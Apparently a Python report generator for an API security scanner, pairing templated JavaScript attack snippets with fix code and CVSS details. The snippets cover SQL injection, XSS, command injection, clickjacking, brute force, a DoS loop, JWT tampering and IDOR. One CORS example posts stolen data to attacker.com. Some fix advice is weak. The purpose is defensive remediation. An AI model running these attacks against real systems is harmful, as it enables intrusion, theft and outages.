import json

def generate_report(findings, report_path, api_url=None, curl_cmd=None, curl_info=None, severity='all'):
    """
    Generate a detailed markdown report from findings, categorizing security issues by severity and urgency. Include priority-based remediation summary.
    """
    def section(title):
        return f"\n## {title}\n"

    def get_attack_code(vulnerability_type, payload, url, method="GET", headers=None, data=None):
        """Generate specific attack code for each vulnerability type with detailed information"""
        attack_codes = {
            'sql_injection': {
                'description': 'SQL Injection allows attackers to execute arbitrary SQL commands in your database by manipulating input parameters.',
                'impact': 'Complete database compromise, data theft, data manipulation, privilege escalation, system access',
                'cvss_score': '9.8 (Critical)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'None',
                'scope': 'Changed',
                'confidentiality': 'High',
                'integrity': 'High',
                'availability': 'High',
                'attack_code': f'''// SQL Injection Attack Code
const sqlPayload = "{payload}";
const maliciousUrl = "{url}?id=" + encodeURIComponent(sqlPayload);

// Attack Simulation
fetch(maliciousUrl, {{
    method: "{method}",
    headers: {{
        'Authorization': 'Bearer your-token',
        'Content-Type': 'application/json'
    }}
}})
.then(response => response.text())
.then(data => {{
    console.log("SQL Injection Response:", data);
    // Check for SQL error messages or unexpected data
    if (data.includes("sql") || data.includes("mysql") || data.includes("error")) {{
        console.log("SQL Injection Vulnerability Detected!");
    }}
}});''',
                'fix_code': '''// SQL Injection Fix Code
// 1. Use Parameterized Queries (PREPARED STATEMENTS)
const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId], (err, results) => {
    // Safe from SQL injection
});

// 2. Input Validation and Sanitization
function validateUserId(userId) {
    return /^[0-9]+$/.test(userId);
}

// 3. Use ORM with built-in protection
const user = await User.findOne({
    where: { id: userId }
});

// 4. Implement Least Privilege Principle
// Use database user with minimal required permissions

// 5. Enable SQL Injection Protection in WAF
// Configure rules to block common SQL injection patterns

// 6. Regular Security Testing
// Use automated tools and manual testing''',
                'prevention_methods': [
                    'Use parameterized queries/prepared statements',
                    'Input validation and sanitization',
                    'Implement least privilege principle',
                    'Use ORM with built-in protection',
                    'Enable WAF protection',
                    'Regular security testing'
                ]
            },
            'xss': {
                'description': 'Cross-Site Scripting allows attackers to inject malicious scripts into web pages that execute in users\' browsers.',
                'impact': 'Session hijacking, credential theft, defacement, malware distribution, data exfiltration',
                'cvss_score': '8.2 (High)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'Required',
                'scope': 'Changed',
                'confidentiality': 'Low',
                'integrity': 'Low',
                'availability': 'None',
                'attack_code': f'''// XSS Attack Code
const xssPayload = "{payload}";
const maliciousUrl = "{url}?q=" + encodeURIComponent(xssPayload);

// Attack Simulation
fetch(maliciousUrl, {{
    method: "{method}",
    headers: {{
        'Authorization': 'Bearer your-token'
    }}
}})
.then(response => response.text())
.then(data => {{
    // Check if script is reflected in response
    if (data.includes("<script>") || data.includes("javascript:")) {{
        console.log("XSS Vulnerability Found!");
        console.log("Payload reflected:", data.includes(xssPayload));
    }}
}});''',
                'fix_code': '''// XSS Fix Code
// 1. Output Encoding (HTML Context)
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// 2. Content Security Policy (CSP)
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none'";

// 3. Input Sanitization
function sanitizeInput(input) {
    return input.replace(/[<>]/g, '');
}

// 4. HttpOnly Cookies
response.headers['Set-Cookie'] = 'session=value; HttpOnly; Secure; SameSite=Strict';

// 5. X-XSS-Protection Header
response.headers['X-XSS-Protection'] = '1; mode=block';

// 6. Input Validation
function validateInput(input) {
    const allowedPattern = /^[a-zA-Z0-9\s]+$/;
    return allowedPattern.test(input);
}''',
                'prevention_methods': [
                    'Output encoding for all user input',
                    'Content Security Policy (CSP)',
                    'Input validation and sanitization',
                    'HttpOnly cookies for session management',
                    'X-XSS-Protection header',
                    'Regular security testing'
                ]
            },
            'command_injection': {
                'description': 'Command Injection allows attackers to execute arbitrary system commands on the server by manipulating input parameters.',
                'impact': 'Complete server compromise, data theft, malware installation, privilege escalation, system access',
                'cvss_score': '9.8 (Critical)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'None',
                'scope': 'Changed',
                'confidentiality': 'High',
                'integrity': 'High',
                'availability': 'High',
                'attack_code': f'''// Command Injection Attack Code
const cmdPayload = "{payload}";
const maliciousUrl = "{url}?cmd=" + encodeURIComponent(cmdPayload);

// Attack Simulation
fetch(maliciousUrl, {{
    method: "{method}",
    headers: {{
        'Authorization': 'Bearer your-token'
    }}
}})
.then(response => response.text())
.then(data => {{
    console.log("Command Injection Response:", data);
    // Check for system command output
    if (data.includes("root:") || data.includes("bin:") || data.includes("usr:")) {{
        console.log("Command Injection Vulnerability Detected!");
    }}
}});''',
                'fix_code': '''// Command Injection Fix Code
// 1. Avoid system calls with user input
// Instead of: exec(userInput)
// Use: safeApiCall(userInput)

// 2. Input Validation and Whitelisting
function validateCommand(input) {
    const allowedCommands = ['ls', 'cat', 'grep'];
    return allowedCommands.includes(input);
}

// 3. Use safe APIs instead of system calls
const fs = require('fs');
fs.readFile(filename, 'utf8', (err, data) => {
    // Safe file reading
});

// 4. Implement Command Allowlist
const allowedCommands = new Set(['safe_command1', 'safe_command2']);
if (!allowedCommands.has(userCommand)) {
    throw new Error('Command not allowed');
}

// 5. Use Process Isolation
// Run commands in isolated containers or sandboxes

// 6. Implement Least Privilege
// Use service accounts with minimal permissions''',
                'prevention_methods': [
                    'Avoid system calls with user input',
                    'Input validation and whitelisting',
                    'Use safe APIs instead of system calls',
                    'Implement command allowlist',
                    'Process isolation and sandboxing',
                    'Least privilege principle'
                ]
            },
            'security_headers': {
                'description': 'Missing security headers expose the application to various attacks including XSS, clickjacking, and protocol downgrade attacks.',
                'impact': 'XSS, clickjacking, protocol downgrade, MIME confusion attacks, information disclosure',
                'cvss_score': '6.5 (Medium)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'Required',
                'scope': 'Unchanged',
                'confidentiality': 'Low',
                'integrity': 'Low',
                'availability': 'None',
                'attack_code': f'''// Security Headers Attack Code
// 1. XSS Attack (if CSP missing)
const xssPayload = "<script>alert('XSS')</script>";
fetch("{url}?q=" + encodeURIComponent(xssPayload));

// 2. Clickjacking Attack (if X-Frame-Options missing)
const clickjackingPage = `
<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
    <h1>🎁 Click for free prize!</h1>
    <iframe src="{url}" style="opacity:0.1; position:absolute; top:50px; left:50px;"></iframe>
    <button onclick="triggerDelete()" style="position:absolute; top:50px; left:50px; z-index:1000;">
        🎁 CLAIM PRIZE
    </button>
    <script>
        function triggerDelete() {{
            fetch("{url}", {{method: "DELETE"}});
        }}
    </script>
</body>
</html>`;

// 3. Protocol Downgrade (if HSTS missing)
// Attacker intercepts HTTPS and forces HTTP
fetch("{url}".replace('https://', 'http://'));''',
                'fix_code': '''// Security Headers Fix Code
// Add these headers to all API responses
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none'";
response.headers['X-Frame-Options'] = 'DENY';
response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload';
response.headers['X-Content-Type-Options'] = 'nosniff';
response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin';
response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=(), payment=()';
response.headers['X-XSS-Protection'] = '1; mode=block';
response.headers['Access-Control-Allow-Origin'] = 'https://yourdomain.com';
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE';
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization';
response.headers['X-Permitted-Cross-Domain-Policies'] = 'none';
response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, proxy-revalidate';
response.headers['Pragma'] = 'no-cache';
response.headers['Expires'] = '0';''',
                'prevention_methods': [
                    'Implement Content Security Policy (CSP)',
                    'Set X-Frame-Options to prevent clickjacking',
                    'Enable Strict-Transport-Security (HSTS)',
                    'Set X-Content-Type-Options to nosniff',
                    'Configure Referrer-Policy',
                    'Set Permissions-Policy for feature control'
                ]
            },
            'cors': {
                'description': 'Misconfigured CORS allows unauthorized cross-origin requests from malicious websites.',
                'impact': 'Data theft, unauthorized API access, cross-origin attacks, session hijacking',
                'cvss_score': '7.5 (High)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'Required',
                'scope': 'Changed',
                'confidentiality': 'High',
                'integrity': 'None',
                'availability': 'None',
                'attack_code': f'''// CORS Attack Code
// From malicious website: https://attacker.com
fetch("{url}", {{
    method: "{method}",
    headers: {{
        'Authorization': 'Bearer stolen-token',
        'Content-Type': 'application/json'
    }},
    credentials: 'include' // Sends cookies
}})
.then(response => response.json())
.then(data => {{
    // Steal sensitive data
    console.log("Stolen data:", data);
    // Send to attacker's server
    fetch('https://attacker.com/steal', {{
        method: 'POST',
        body: JSON.stringify(data)
    }});
}});''',
                'fix_code': '''// CORS Fix Code
// 1. Restrict CORS to trusted origins
response.headers['Access-Control-Allow-Origin'] = 'https://yourdomain.com';
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, DELETE';
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization';
response.headers['Access-Control-Allow-Credentials'] = 'true';

// 2. Validate Origin
function validateOrigin(origin) {
    const allowedOrigins = ['https://yourdomain.com', 'https://app.yourdomain.com'];
    return allowedOrigins.includes(origin);
}

// 3. Implement Proper CORS Policy
if (request.headers.origin) {
    const allowedOrigins = ['https://yourdomain.com'];
    if (allowedOrigins.includes(request.headers.origin)) {
        response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
    }
}

// 4. Use SameSite Cookies
response.headers['Set-Cookie'] = 'session=value; SameSite=Strict; Secure; HttpOnly';''',
                'prevention_methods': [
                    'Restrict CORS to trusted origins only',
                    'Validate origin headers',
                    'Use SameSite cookies',
                    'Implement proper CORS policy',
                    'Regular security testing',
                    'Monitor for unauthorized requests'
                ]
            },
            'rate_limiting': {
                'description': 'Missing rate limiting allows API abuse, DoS attacks, and resource exhaustion.',
                'impact': 'API abuse, DoS attacks, resource exhaustion, cost escalation, service degradation',
                'cvss_score': '7.5 (High)',
                'attack_vector': 'Network',
                'complexity': 'Low',
                'privileges_required': 'None',
                'user_interaction': 'None',
                'scope': 'Unchanged',
                'confidentiality': 'None',
                'integrity': 'None',
                'availability': 'High',
                'attack_code': f'''// Rate Limiting Attack Code
// Brute force attack
async function bruteForceAttack() {{
    const passwords = ['admin', 'password', '123456', 'qwerty'];
    
    for (let i = 0; i < 1000; i++) {{
        for (const password of passwords) {{
            fetch("{url}", {{
                method: "POST",
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    username: 'admin',
                    password: password
                }})
            }});
        }}
        // No delay - rapid fire requests
    }}
}}

// DoS attack
setInterval(() => {{
    fetch("{url}", {{method: "{method}"}});
}}, 1); // 1000 requests per second''',
                'fix_code': '''// Rate Limiting Fix Code
// 1. Implement rate limiting middleware
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({{
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP',
    standardHeaders: true,
    legacyHeaders: false,
    handler: (req, res) => {{
        res.status(429).json({{
            error: 'Too many requests',
            retryAfter: Math.ceil(windowMs / 1000)
        }});
    }}
}});

app.use('/api/', limiter);

// 2. Use Redis for distributed rate limiting
const Redis = require('ioredis');
const redis = new Redis();

async function checkRateLimit(ip) {{
    const key = `rate_limit:${{ip}}`;
    const current = await redis.incr(key);
    if (current === 1) {{
        await redis.expire(key, 60);
    }}
    return current <= 100;
}}

// 3. Implement Token Bucket Algorithm
class TokenBucket {{
    constructor(capacity, refillRate) {{
        this.capacity = capacity;
        this.refillRate = refillRate;
        this.tokens = capacity;
        this.lastRefill = Date.now();
    }}
    
    consume(tokens) {{
        this.refill();
        if (this.tokens >= tokens) {{
            this.tokens -= tokens;
            return true;
        }}
        return false;
    }}
    
    refill() {{
        const now = Date.now();
        const timePassed = now - this.lastRefill;
        const tokensToAdd = (timePassed / 1000) * this.refillRate;
        this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);
        this.lastRefill = now;
    }}
}}''',
                'prevention_methods': [
                    'Implement rate limiting per IP/user',
                    'Use token bucket algorithm',
                    'Distributed rate limiting with Redis',
                    'Monitor API usage patterns',
                    'Implement circuit breakers',
                    'Use CDN for DDoS protection'
                ]
            },
            'authentication': {
                'description': 'Weak authentication allows unauthorized access.',
                'impact': 'Unauthorized access, privilege escalation, data breach',
                'attack_code': f'''// Authentication Bypass Attack Code
// 1. Try common credentials
const commonCredentials = [
    {{username: 'admin', password: 'admin'}},
    {{username: 'admin', password: 'password'}},
    {{username: 'admin', password: '123456'}},
    {{username: 'test', password: 'test'}},
    {{username: 'user', password: 'user'}}
];

for (const cred of commonCredentials) {{
    fetch("{url}", {{
        method: "POST",
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(cred)
    }});
}}

// 2. JWT token manipulation
const jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoidXNlciJ9";
const decoded = JSON.parse(atob(jwt.split('.')[1]));
decoded.role = 'admin'; // Elevate privileges
const newJwt = createJWT(decoded);''',
                'fix_code': '''// Authentication Fix Code
// 1. Strong password policy
function validatePassword(password) {
    const minLength = 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /[0-9]/.test(password);
    const hasSpecialChar = /[!@#$%^&*]/.test(password);
    
    return password.length >= minLength && 
           hasUpperCase && hasLowerCase && 
           hasNumbers && hasSpecialChar;
}

// 2. JWT validation
function validateJWT(token) {
    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        return decoded;
    } catch (error) {
        return null;
    }
}

// 3. Multi-factor authentication
function requireMFA(userId) {
    // Send SMS/email code
    // Verify before allowing access
}'''
            },
            'authorization': {
                'description': 'Missing authorization checks allow privilege escalation.',
                'impact': 'Unauthorized data access, privilege escalation, data breach',
                'attack_code': f'''// Authorization Bypass Attack Code
// 1. IDOR (Insecure Direct Object Reference)
// Try to access other users' data
for (let userId = 1; userId <= 100; userId++) {{
    fetch(`{url.replace('/123', '')}/${{userId}}`, {{
        method: "{method}",
        headers: {{'Authorization': 'Bearer user-token'}}
    }});
}}

// 2. Role manipulation
const userToken = "eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoidXNlciJ9";
const adminToken = userToken.replace('"role":"user"', '"role":"admin"');

// 3. Parameter tampering
fetch("{url}?admin=true&role=admin", {{
    method: "{method}",
    headers: {{'Authorization': 'Bearer user-token'}}
}});''',
                'fix_code': '''// Authorization Fix Code
// 1. Check user permissions
function checkPermission(userId, resourceId, action) {
    const user = getUser(userId);
    const resource = getResource(resourceId);
    
    return user.can(action, resource);
}

// 2. Validate resource ownership
function validateOwnership(userId, resourceId) {
    const resource = getResource(resourceId);
    return resource.ownerId === userId;
}

// 3. Role-based access control
function requireRole(requiredRole) {
    return (req, res, next) => {
        if (req.user.role !== requiredRole) {
            return res.status(403).json({error: 'Insufficient permissions'});
        }
        next();
    };
}'''
            }
        }
        
        return attack_codes.get(vulnerability_type, {
            'description': f'{vulnerability_type.replace("_", " ").title()} vulnerability detected',
            'impact': 'Security risk that should be addressed',
            'attack_code': f'// {vulnerability_type.replace("_", " ").title()} Attack Code\n// Implement specific attack for {vulnerability_type}',
            'fix_code': f'// {vulnerability_type.replace("_", " ").title()} Fix Code\n// Implement specific fix for {vulnerability_type}'
        })

    def remediation_suggestion(failure_type):
        suggestions = {
            'https': "Enable HTTPS to encrypt data in transit.",
            'open_endpoint': "Require authentication for this endpoint.",
            'sql_injection': "Use parameterized queries and input validation to prevent SQL injection.",
            'xss': "Implement input sanitization and output encoding to prevent XSS attacks.",
            'command_injection': "Sanitize input and avoid system calls to prevent command injection.",
            'xxe': "Disable external entity processing and validate XML input.",
            'ssrf': "Validate and whitelist allowed URLs, disable redirects.",
            'security_header': "Set missing security headers in your API responses.",
            'rate_limiting': "Implement rate limiting (e.g., 429 responses) to prevent abuse.",
            'cors': "Restrict CORS to trusted origins only, not '*'."
        }
        return suggestions.get(failure_type, "Review this issue for best security practices.")

    def categorize_finding(finding_type, finding_details):
        """Categorize findings by severity and urgency"""
        critical_issues = {
            'sql_injection': ('Critical', 'Within 24 hours', 'High - Could lead to data breach or system compromise'),
            'command_injection': ('Critical', 'Within 24 hours', 'High - Could lead to complete server compromise'),
            'xxe': ('Critical', 'Within 24 hours', 'High - Could lead to file disclosure or SSRF'),
            'ssrf': ('Critical', 'Within 24 hours', 'High - Could lead to internal network access'),
        }
        
        high_issues = {
            'xss': ('High', 'Within 1 week', 'Medium - Could be exploited by attackers'),
            'nosql_injection': ('High', 'Within 1 week', 'Medium - Database manipulation possible'),
            'ldap_injection': ('High', 'Within 1 week', 'Medium - Directory service compromise'),
            'path_traversal': ('High', 'Within 1 week', 'Medium - File system access possible'),
            'jwt_attacks': ('High', 'Within 1 week', 'Medium - Authentication bypass possible'),
            'mass_assignment': ('High', 'Within 1 week', 'Medium - Privilege escalation possible'),
            'auth_bypass': ('High', 'Within 1 week', 'Medium - Authentication controls bypassed'),
        }
        
        medium_issues = {
            'security_headers': ('Medium', 'Within 1 month', 'Low-Medium - Best practice improvements'),
            'cors': ('Medium', 'Within 1 month', 'Low-Medium - Cross-origin policy issues'),
            'rate_limiting': ('Medium', 'Within 1 month', 'Low-Medium - API abuse possible'),
            'error_handling': ('Medium', 'Within 1 month', 'Low - Information disclosure'),
            'sensitive_data': ('Medium', 'Within 1 month', 'Low-Medium - Data exposure risk'),
        }
        
        low_issues = {
            'information_disclosure': ('Low', 'Within 3 months', 'Low - Minor information leakage'),
            'timing_attacks': ('Low', 'Within 3 months', 'Low - Potential timing side-channel'),
        }
        
        if finding_type in critical_issues:
            return critical_issues[finding_type]
        elif finding_type in high_issues:
            return high_issues[finding_type]
        elif finding_type in medium_issues:
            return medium_issues[finding_type]
        elif finding_type in low_issues:
            return low_issues[finding_type]
        else:
            return ('Medium', 'Within 1 month', 'Medium - Security improvement recommended')

    # Categorize findings by priority
    critical_findings = []
    high_findings = []
    medium_findings = []
    low_findings = []
    passed = []

    api_findings = findings.get('api', {})
    
    # Handle new structure where vulnerabilities are nested
    if isinstance(api_findings, dict) and 'vulnerabilities' in api_findings:
        api_findings = api_findings['vulnerabilities']

    # Process API findings - handle both old format (by finding type) and new format (by severity)
    if isinstance(api_findings, dict) and any(key in api_findings for key in ['critical', 'high', 'medium', 'low']):
        # New format: findings organized by severity level
        for severity_level, findings_list in api_findings.items():
            for finding in findings_list:
                if isinstance(finding, str):
                    if finding.startswith('MISSING_SECURITY_HEADERS:'):
                        # Parse security headers finding
                        missing_headers_str = finding.replace('MISSING_SECURITY_HEADERS: ', '')
                        missing_headers = [h.strip() for h in missing_headers_str.split(',')]
                        
                        for header in missing_headers:
                            priority, timeline, risk = categorize_finding('security_header', header)
                            if severity_level == 'critical':
                                critical_findings.append(('security_headers', f"Missing security header: {header}", priority, timeline, risk, [header], api_url))
                            elif severity_level == 'high':
                                high_findings.append(('security_headers', f"Missing security header: {header}", priority, timeline, risk, [header], api_url))
                            elif severity_level == 'medium':
                                medium_findings.append(('security_headers', f"Missing security header: {header}", priority, timeline, risk, [header], api_url))
                            elif severity_level == 'low':
                                low_findings.append(('security_headers', f"Missing security header: {header}", priority, timeline, risk, [header], api_url))
                    
                    elif finding.startswith('METADATA_LEAKAGE:'):
                        # Parse metadata leakage finding
                        priority, timeline, risk = categorize_finding('metadata_leakage', finding)
                        if severity_level == 'critical':
                            critical_findings.append(('metadata_leakage', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'high':
                            high_findings.append(('metadata_leakage', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'medium':
                            medium_findings.append(('metadata_leakage', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'low':
                            low_findings.append(('metadata_leakage', finding, priority, timeline, risk, [], api_url))
                    
                    else:
                        # Handle other finding types
                        priority, timeline, risk = categorize_finding('general', finding)
                        if severity_level == 'critical':
                            critical_findings.append(('general', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'high':
                            high_findings.append(('general', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'medium':
                            medium_findings.append(('general', finding, priority, timeline, risk, [], api_url))
                        elif severity_level == 'low':
                            low_findings.append(('general', finding, priority, timeline, risk, [], api_url))
    else:
        # Old format: findings organized by finding type
        for finding_type, finding_data in api_findings.items():
            if finding_type == 'https' and finding_data:
                passed.append(("HTTPS enabled", "API uses HTTPS"))
            elif finding_type == 'https' and not finding_data:
                priority, timeline, risk = categorize_finding('https', finding_data)
                critical_findings.append((finding_type, f"API not using HTTPS", priority, timeline, risk, [], api_url))
        
            elif finding_type == 'open_endpoints' and not finding_data:
                passed.append(("All endpoints require authentication", "No open endpoints found"))
            elif finding_type == 'open_endpoints' and finding_data:
                for endpoint in finding_data:
                    priority, timeline, risk = categorize_finding('open_endpoint', endpoint)
                    high_findings.append((finding_type, f"Open endpoint: {endpoint}", priority, timeline, risk, [], endpoint))
        
            elif finding_type in ['sql_injection', 'xss', 'command_injection', 'xxe', 'nosql_injection', 'ldap_injection', 'path_traversal'] and finding_data:
                for vuln in finding_data:
                    url = vuln.get('url', api_url)
                    payloads = vuln.get('payloads', [])
                    priority, timeline, risk = categorize_finding(finding_type, vuln)
                    
                    if priority == 'Critical':
                        critical_findings.append((finding_type, f"{finding_type.replace('_', ' ').title()} on: {url} (Payloads: {len(payloads)})", priority, timeline, risk, payloads, url))
                    elif priority == 'High':
                        high_findings.append((finding_type, f"{finding_type.replace('_', ' ').title()} on: {url} (Payloads: {len(payloads)})", priority, timeline, risk, payloads, url))
        
            elif finding_type in ['sql_injection', 'xss', 'command_injection', 'xxe', 'nosql_injection', 'ldap_injection', 'path_traversal'] and not finding_data:
                passed.append((f"No {finding_type.replace('_', ' ')} vulnerabilities detected", f"All endpoints safe from {finding_type.replace('_', ' ')}"))
        
            elif finding_type == 'security_headers':
                # Handle security headers findings from scanner
                if isinstance(finding_data, str) and finding_data.startswith('MISSING_SECURITY_HEADERS:'):
                    # Parse the missing headers from the scanner format
                    missing_headers_str = finding_data.replace('MISSING_SECURITY_HEADERS: ', '')
                    missing_headers = [h.strip() for h in missing_headers_str.split(',')]
                    
                    for header in missing_headers:
                        priority, timeline, risk = categorize_finding('security_header', header)
                        medium_findings.append(('security_headers', f"Missing security header: {header}", priority, timeline, risk, [header], api_url))
                elif isinstance(finding_data, dict):
                    # Handle the expected format with header details
                    for url, headers in finding_data.items():
                        missing_headers = [h for h, v in headers.items() if v is None]
                        present_headers = [h for h, v in headers.items() if v is not None]
                        
                        for header in missing_headers:
                            priority, timeline, risk = categorize_finding('security_header', header)
                            medium_findings.append(('security_headers', f"Missing security header {header} on {url}", priority, timeline, risk, [header], url))
                        
                        for header in present_headers:
                            passed.append((f"{header} set on {url}", headers[header]))
        
            elif finding_type == 'metadata_leakage' and finding_data:
                # Handle metadata leakage findings
                if isinstance(finding_data, str):
                    priority, timeline, risk = categorize_finding('metadata_leakage', finding_data)
                    medium_findings.append(('metadata_leakage', finding_data, priority, timeline, risk, [], api_url))

    with open(report_path, 'w') as f:
        f.write("# CyberSec Bot Report\n\n")
        
        # Add severity level info
        severity_badges = {
            'critical': '🔴 **CRITICAL**',
            'high': '🟠 **HIGH**', 
            'medium': '🟡 **MEDIUM**',
            'all': '🔵 **COMPREHENSIVE**'
        }
        f.write(f"**Scan Level:** {severity_badges.get(severity, '🔵 **COMPREHENSIVE**')} - {severity.upper()} security checks\n\n")

        # --- API Endpoint and Curl Command ---
        if api_url:
            f.write(f"**Scanned API Endpoint:** `{api_url}`\n\n")
        if curl_cmd:
            f.write(f"**Original curl command:**\n\n")
            f.write(f"```bash\n{curl_cmd}\n```\n\n")
        if curl_info:
            f.write(f"**Parsed curl details:**\n\n")
            f.write(f"- Method: `{curl_info.get('method','GET')}`\n")
            f.write(f"- Headers: `{curl_info.get('headers',{})}`\n")
            if curl_info.get('data'):
                f.write(f"- Data: `{curl_info.get('data')}`\n")
            f.write("\n")
        if api_url and not curl_cmd:
            f.write(f"**Sample curl command:**\n\n")
            f.write(f"```bash\ncurl -i '{api_url}'\n```\n\n")

        # --- Priority-Based Security Summary ---
        total_issues = len(critical_findings) + len(high_findings) + len(medium_findings) + len(low_findings)
        security_score = max(0, 100 - (len(critical_findings) * 40 + len(high_findings) * 20 + len(medium_findings) * 10 + len(low_findings) * 5))
        
        f.write("## 🚨 Security Priority Summary\n\n")
        f.write(f"**Total Issues Found:** {total_issues}\n")
        f.write(f"**Security Score:** {security_score}/100\n\n")

        # Critical findings
        if critical_findings:
            f.write("### 🔴 CRITICAL - Immediate Fix Required (Within 24 Hours)\n")
            f.write("*These vulnerabilities pose immediate security risks and should be fixed immediately.*\n\n")
            for i, (finding_type, description, priority, timeline, risk, payloads, url) in enumerate(critical_findings, 1):
                f.write(f"{i}. **{description}**\n")
                f.write(f"   - **Action:** {remediation_suggestion(finding_type)}\n")
                f.write(f"   - **Timeline:** {timeline}\n")
                f.write(f"   - **Risk:** {risk}\n\n")
        else:
            f.write("### ✅ CRITICAL - No Critical Issues Found\n\n")

        # High findings
        if high_findings:
            f.write("### 🟠 HIGH - Important (Within 1 Week)\n")
            f.write("*These issues should be addressed promptly to maintain security posture.*\n\n")
            for i, (finding_type, description, priority, timeline, risk, payloads, url) in enumerate(high_findings, 1):
                f.write(f"{i}. **{description}**\n")
                f.write(f"   - **Action:** {remediation_suggestion(finding_type)}\n")
                f.write(f"   - **Timeline:** {timeline}\n")
                f.write(f"   - **Risk:** {risk}\n\n")
        else:
            f.write("### ✅ HIGH - No High Priority Issues Found\n\n")

        # Medium findings
        if medium_findings:
            f.write("### 🟡 MEDIUM - Should Fix (Within 1 Month)\n")
            f.write("*These improvements will strengthen your security posture.*\n\n")
            for i, (finding_type, description, priority, timeline, risk, payloads, url) in enumerate(medium_findings, 1):
                f.write(f"{i}. **{description}**\n")
                f.write(f"   - **Action:** {remediation_suggestion(finding_type)}\n")
                f.write(f"   - **Timeline:** {timeline}\n")
                f.write(f"   - **Risk:** {risk}\n\n")
        else:
            f.write("### ✅ MEDIUM - No Medium Priority Issues Found\n\n")

        # Low findings
        if low_findings:
            f.write("### 🟡 LOW - Consider Fixing (Within 3 Months)\n")
            f.write("*These are minor improvements for enhanced security.*\n\n")
            for i, (finding_type, description, priority, timeline, risk, payloads, url) in enumerate(low_findings, 1):
                f.write(f"{i}. **{description}**\n")
                f.write(f"   - **Action:** {remediation_suggestion(finding_type)}\n")
                f.write(f"   - **Timeline:** {timeline}\n")
                f.write(f"   - **Risk:** {risk}\n\n")
        else:
            f.write("### ✅ LOW - No Low Priority Issues Found\n\n")

        # --- ATTACK CODE & FIX CODE SECTION ---
        all_findings = critical_findings + high_findings + medium_findings + low_findings
        if all_findings:
            f.write("## 🔍 Attack Code & Fix Code for Every Vulnerability\n\n")
            f.write("*This section provides developers with exact attack code to simulate vulnerabilities and fix code to resolve them.*\n\n")
            
            for i, (finding_type, description, priority, timeline, risk, payloads, url) in enumerate(all_findings, 1):
                # Get attack and fix code for this vulnerability type
                vulnerability_info = get_attack_code(finding_type, payloads[0] if payloads else "test_payload", url, 
                                                   curl_info.get('method', 'GET') if curl_info else 'GET',
                                                   curl_info.get('headers', {}) if curl_info else {},
                                                   curl_info.get('data') if curl_info else None)
                
                f.write(f"### {i}. {finding_type.replace('_', ' ').title()} Vulnerability\n\n")
                f.write(f"**🎯 Target:** `{url}`\n\n")
                f.write(f"**📝 Description:** {vulnerability_info['description']}\n\n")
                f.write(f"**💥 Impact:** {vulnerability_info['impact']}\n\n")
                
                # Add CVSS Score and Details if available
                if 'cvss_score' in vulnerability_info:
                    f.write(f"**🔍 CVSS Score:** {vulnerability_info['cvss_score']}\n\n")
                    f.write("**📊 CVSS Details:**\n")
                    f.write(f"- **Attack Vector:** {vulnerability_info.get('attack_vector', 'N/A')}\n")
                    f.write(f"- **Complexity:** {vulnerability_info.get('complexity', 'N/A')}\n")
                    f.write(f"- **Privileges Required:** {vulnerability_info.get('privileges_required', 'N/A')}\n")
                    f.write(f"- **User Interaction:** {vulnerability_info.get('user_interaction', 'N/A')}\n")
                    f.write(f"- **Scope:** {vulnerability_info.get('scope', 'N/A')}\n")
                    f.write(f"- **Confidentiality:** {vulnerability_info.get('confidentiality', 'N/A')}\n")
                    f.write(f"- **Integrity:** {vulnerability_info.get('integrity', 'N/A')}\n")
                    f.write(f"- **Availability:** {vulnerability_info.get('availability', 'N/A')}\n\n")
                
                f.write(f"**🔴 Priority:** {priority} - {timeline}\n\n")
                
                if payloads:
                    f.write("**🎯 Successful Payloads:**\n")
                    for j, payload in enumerate(payloads[:5], 1):  # Show top 5 payloads
                        f.write(f"{j}. `{payload}`\n")
                    f.write("\n")
                
                f.write("**⚔️ Attack Code (How to Simulate):**\n")
                f.write("```javascript\n")
                f.write(vulnerability_info['attack_code'])
                f.write("\n```\n\n")
                
                f.write("**🛡️ Fix Code (How to Resolve):**\n")
                f.write("```javascript\n")
                f.write(vulnerability_info['fix_code'])
                f.write("\n```\n\n")
                
                # Add Prevention Methods if available
                if 'prevention_methods' in vulnerability_info:
                    f.write("**🛡️ Prevention Methods:**\n")
                    for method in vulnerability_info['prevention_methods']:
                        f.write(f"- {method}\n")
                    f.write("\n")
                
